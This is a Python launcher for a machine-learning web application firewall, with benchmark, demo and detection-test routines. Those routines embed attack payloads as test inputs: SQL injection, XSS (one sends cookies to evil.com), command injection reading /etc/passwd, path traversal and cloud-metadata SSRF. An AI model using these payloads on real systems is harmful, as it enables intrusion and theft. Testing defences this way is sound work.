#!/usr/bin/env python3
"""
MIRAGE ML-WAF
Ultra-low latency Web Application Firewall with ML-powered detection

SECURITY HARDENED - v2.0.0

Usage:
    python main.py server     - Start WAF server
    python main.py test       - Run test suite
    python main.py benchmark  - Run performance benchmark
    python main.py demo       - Run interactive demo
    python main.py security   - Check security status
"""
import sys
import os
import argparse
import time

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ============================================================================
# SECURITY: Import security enforcement FIRST (blocks vulnerable imports)
# ============================================================================
try:
    import core.security_imports
    SECURITY_ENFORCEMENT = True
except ImportError as e:
    print(f"[WARNING] Security imports not available: {e}")
    SECURITY_ENFORCEMENT = False

def run_server():
    """Start the WAF server"""
    # Enforce production security if applicable
    if SECURITY_ENFORCEMENT and os.environ.get('ENV') == 'production':
        core.security_imports.enforce_production_security()
    
    from api.app import run_server as start_api
    print("""
    ================================================================

                    MIRAGE ML-WAF
                 ML-Powered WAF v2.0.0-SECURE

    ================================================================
    """)
    start_api()

def run_tests():
    """Run the test suite"""
    from tests.test_waf import run_all_tests
    success = run_all_tests()
    sys.exit(0 if success else 1)

def run_benchmark():
    """Run performance benchmark"""
    print("\n[BENCHMARK] MIRAGE Performance Benchmark\n")
    print("="*60)
    
    from core.waf_engine import WAFEngine
    from core.models import RequestContext
    import uuid
    
    waf = WAFEngine()
    
    # Test payloads
    payloads = [
        # SQLi
        ("SQLi", "id=' OR 1=1--"),
        ("SQLi UNION", "id=' UNION SELECT * FROM users--"),
        # XSS
        ("XSS", "name=<script>alert(1)</script>"),
        ("XSS Event", "name=<img src=x onerror=alert(1)>"),
        # RCE
        ("RCE", "cmd=; cat /etc/passwd"),
        # LFI
        ("LFI", "file=../../../etc/passwd"),
        # Normal
        ("Normal", "search=hello+world"),
        ("Normal", "page=1&limit=10"),
    ]
    
    # Warmup
    print("Warming up...")
    for _ in range(100):
        ctx = RequestContext(
            request_id=str(uuid.uuid4()),
            timestamp=time.time(),
            client_ip="127.0.0.1",
            client_port=12345,
            server_ip="0.0.0.0",
            server_port=8080,
            method="GET",
            path="/api/test",
            query_string="q=warmup",
            headers={"user-agent": "test"},
            body=b"",
        )
        waf.analyze_request(ctx)
    
    print("\nRunning benchmark...\n")
    
    results = []
    
    for name, query in payloads:
        latencies = []
        
        for _ in range(1000):
            ctx = RequestContext(
                request_id=str(uuid.uuid4()),
                timestamp=time.time(),
                client_ip="127.0.0.1",
                client_port=12345,
                server_ip="0.0.0.0",
                server_port=8080,
                method="GET",
                path="/api/test",
                query_string=query,
                headers={"user-agent": "Benchmark/1.0"},
                body=b"",
            )
            
            result = waf.analyze_request(ctx)
            latencies.append(result.latency_ms)
        
        avg = sum(latencies) / len(latencies)
        p50 = sorted(latencies)[500]
        p95 = sorted(latencies)[950]
        p99 = sorted(latencies)[990]
        
        results.append({
            'name': name,
            'avg': avg,
            'p50': p50,
            'p95': p95,
            'p99': p99,
        })
        
        status = "✅" if avg < 5.0 else "⚠️" if avg < 50.0 else "❌"
        print(f"{status} {name:15} | Avg: {avg:.3f}ms | P50: {p50:.3f}ms | P95: {p95:.3f}ms | P99: {p99:.3f}ms")
    
    # Throughput test
    print("\n" + "="*60)
    print("Throughput Test (10,000 requests)...")
    
    start = time.perf_counter()
    for i in range(10000):
        ctx = RequestContext(
            request_id=str(uuid.uuid4()),
            timestamp=time.time(),
            client_ip="127.0.0.1",
            client_port=12345,
            server_ip="0.0.0.0",
            server_port=8080,
            method="GET",
            path="/api/test",
            query_string=f"id={i}",
            headers={"user-agent": "Benchmark/1.0"},
            body=b"",
        )
        waf.analyze_request(ctx)
    
    elapsed = time.perf_counter() - start
    rps = 10000 / elapsed
    
    print(f"\n[PERF] Throughput: {rps:,.0f} requests/second")
    print(f"   Total time: {elapsed:.2f}s for 10,000 requests")
    
    # Summary
    print("\n" + "="*60)
    print("Summary")
    print("="*60)
    
    overall_avg = sum(r['avg'] for r in results) / len(results)
    overall_p99 = max(r['p99'] for r in results)
    
    print(f"  Overall Average Latency: {overall_avg:.3f}ms")
    print(f"  Maximum P99 Latency:     {overall_p99:.3f}ms")
    print(f"  Throughput:              {rps:,.0f} req/s")
    
    if overall_avg < 5.0 and overall_p99 < 50.0:
        print("\n[SUCCESS] WAF meets all latency requirements!")
    else:
        print("\n[WARNING] WAF may need optimization")

def run_demo():
    """Run interactive demo"""
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║           MIRAGE WAF Interactive Demo                     ║
    ╚═══════════════════════════════════════════════════════════════╝
    
    This demo shows the WAF detecting various attack types.
    """)
    
    from core.waf_engine import WAFEngine
    from core.models import RequestContext
    import uuid
    
    waf = WAFEngine()
    
    demos = [
        {
            "name": "SQL Injection Attack",
            "description": "Classic SQLi attempt to bypass authentication",
            "method": "POST",
            "path": "/api/login",
            "query": "",
            "body": "username=admin'--&password=anything",
        },
        {
            "name": "UNION-based SQLi",
            "description": "Attempting to extract data using UNION",
            "method": "GET",
            "path": "/api/users",
            "query": "id=1' UNION SELECT username,password FROM users--",
            "body": "",
        },
        {
            "name": "XSS Reflected Attack",
            "description": "Script injection via search parameter",
            "method": "GET",
            "path": "/search",
            "query": "q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "body": "",
        },
        {
            "name": "Command Injection",
            "description": "Attempting to execute system commands",
            "method": "GET",
            "path": "/api/ping",
            "query": "host=127.0.0.1; cat /etc/passwd",
            "body": "",
        },
        {
            "name": "Path Traversal",
            "description": "Attempting to read sensitive files",
            "method": "GET",
            "path": "/api/download",
            "query": "file=../../../etc/shadow",
            "body": "",
        },
        {
            "name": "SSRF Attack",
            "description": "Attempting to access internal services",
            "method": "POST",
            "path": "/api/fetch",
            "query": "",
            "body": "url=http://169.254.169.254/latest/meta-data/",
        },
        {
            "name": "Normal Request",
            "description": "Legitimate user request (should be allowed)",
            "method": "GET",
            "path": "/api/products",
            "query": "category=electronics&page=1",
            "body": "",
        },
    ]
    
    for i, demo in enumerate(demos, 1):
        print(f"\n{'='*60}")
        print(f"Demo {i}: {demo['name']}")
        print(f"{'='*60}")
        print(f"Description: {demo['description']}")
        print(f"Request: {demo['method']} {demo['path']}")
        if demo['query']:
            print(f"Query: {demo['query'][:80]}...")
        if demo['body']:
            print(f"Body: {demo['body'][:80]}...")
        
        ctx = RequestContext(
            request_id=str(uuid.uuid4()),
            timestamp=time.time(),
            client_ip="192.168.1.100",
            client_port=54321,
            server_ip="10.0.0.1",
            server_port=8080,
            method=demo['method'],
            path=demo['path'],
            query_string=demo['query'],
            headers={"user-agent": "Mozilla/5.0", "host": "example.com"},
            body=demo['body'].encode(),
        )
        
        result = waf.analyze_request(ctx)
        
        print(f"\n📊 WAF Analysis Result:")
        print(f"   Action:     {result.action.name}")
        print(f"   Risk Level: {result.risk_level.name}")
        print(f"   Latency:    {result.latency_ms:.3f}ms")
        
        if result.detections:
            print(f"   Detections:")
            for det in result.detections:
                print(f"      - {det.category} ({det.confidence:.0%}): {det.matched_pattern or 'ML detection'}")
        
        if result.should_block:
            print(f"\n   [BLOCKED] Request BLOCKED - Attack prevented!")
        else:
            print(f"\n   [ALLOWED] Request ALLOWED")
        
        input("\nPress Enter for next demo...")
    
    print("\n" + "="*60)
    print("Demo Complete!")
    print("="*60)
    
    metrics = waf.get_metrics()
    print(f"\nWAF Statistics:")
    print(f"  Total Requests: {metrics['total_requests']}")
    print(f"  Blocked:        {metrics['blocked_requests']}")
    print(f"  Avg Latency:    {metrics['avg_latency_ms']:.3f}ms")

def run_attack_test(waf=None):
    """
    Run comprehensive attack test

    Args:
        waf: Optional WAF engine to use (uses default if None)

    Returns:
        dict: Test results with category-wise rates and overall status
    """
    print("\n🔴 MIRAGE Attack Detection Test\n")
    
    # Define payloads inline to avoid test_waf imports
    SQLI_PAYLOADS = [
        "' OR '1'='1", "' OR 1=1--", "' UNION SELECT * FROM users--",
        "'; DROP TABLE users;--", "1' AND '1'='1",
    ]
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "javascript:alert(1)",
    ]
    RCE_PAYLOADS = [
        "; ls -la", "| cat /etc/passwd", "&& whoami",
        "$(id)", "`uname -a`",
    ]
    LFI_PAYLOADS = [
        "../../../etc/passwd", "....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ]
    SSRF_PAYLOADS = [
        "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22", "file:///etc/passwd",
    ]
    BENIGN_PAYLOADS = [
        "hello world", "search query", "page=1&limit=10",
        "user@example.com", "product_id=12345",
    ]
    
    # Use global waf_engine for consistent behavior
    from core.models import RequestContext, Action
    import uuid
    import time
    
    if waf is None:
        from core.waf_engine import waf_engine
        waf = waf_engine

    test_sets = [
        ("SQL Injection", SQLI_PAYLOADS, True),
        ("XSS", XSS_PAYLOADS, True),
        ("Command Injection", RCE_PAYLOADS, True),
        ("Path Traversal", LFI_PAYLOADS, True),
        ("SSRF", SSRF_PAYLOADS, True),
        ("Benign (FP Test)", BENIGN_PAYLOADS, False),
    ]
    
    results = {
        "categories": {},
        "success": True
    }

    for name, payloads, is_attack_set in test_sets:
        detected = 0
        blocked = 0
        
        for i, payload in enumerate(payloads):
            # Use different IPs for benign vs attack to avoid session contamination
            # Use public IP ranges that won't trigger SSRF detection
            if is_attack_set:
                client_ip = f"203.0.{i}.{abs(hash(payload)) % 255}"
            else:
                client_ip = f"198.51.{i}.{abs(hash(payload)) % 255}"
            
            ctx = RequestContext(
                request_id=str(uuid.uuid4()),
                timestamp=time.time(),
                client_ip=client_ip,
                client_port=54321,
                server_ip="10.0.0.1",
                server_port=8080,
                method="GET",
                path="/api/test",
                query_string=f"input={payload}",
                headers={"user-agent": "TestClient/1.0"},
                body=b"",
            )
            
            result = waf.analyze_request(ctx)
            
            if result.detections:
                detected += 1
            if result.action >= Action.BLOCK:
                blocked += 1
        
        total = len(payloads)
        det_rate = detected / total * 100
        block_rate = blocked / total * 100
        
        if not is_attack_set:
            # For benign, we want LOW detection/block rates
            status_code = "PASS" if det_rate < 20 else "WARN" if det_rate < 50 else "FAIL"
            status = f"[{status_code}]"
            print(f"{status} {name:25} | FP Rate: {det_rate:5.1f}% | {detected}/{total}")
        else:
            # For attacks, we want HIGH detection/block rates
            status_code = "PASS" if det_rate >= 80 else "WARN" if det_rate >= 50 else "FAIL"
            status = f"[{status_code}]"
            print(f"{status} {name:25} | Detection: {det_rate:5.1f}% | Block: {block_rate:5.1f}% | {detected}/{total}")

        results["categories"][name] = {
            "detected": detected,
            "blocked": blocked,
            "total": total,
            "detection_rate": det_rate,
            "block_rate": block_rate,
            "status": status_code
        }

        if status_code == "FAIL":
            results["success"] = False
    
    if results["success"]:
        print("\n[SUCCESS] Attack test complete!")
    else:
        print("\n[FAILED] Attack test failed some checks!")

    return results

def main():
    parser = argparse.ArgumentParser(
        description="MIRAGE ML-WAF",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py server      Start the WAF API server
  python main.py test        Run the test suite
  python main.py benchmark   Run performance benchmark
  python main.py demo        Interactive demo
  python main.py attack      Run attack detection test
        """
    )
    
    parser.add_argument(
        'command',
        choices=['server', 'test', 'benchmark', 'demo', 'attack'],
        help='Command to run'
    )
    
    args = parser.parse_args()
    
    if args.command == 'server':
        run_server()
    elif args.command == 'test':
        run_tests()
    elif args.command == 'benchmark':
        run_benchmark()
    elif args.command == 'demo':
        run_demo()
    elif args.command == 'attack':
        run_attack_test()

if __name__ == "__main__":
    main()
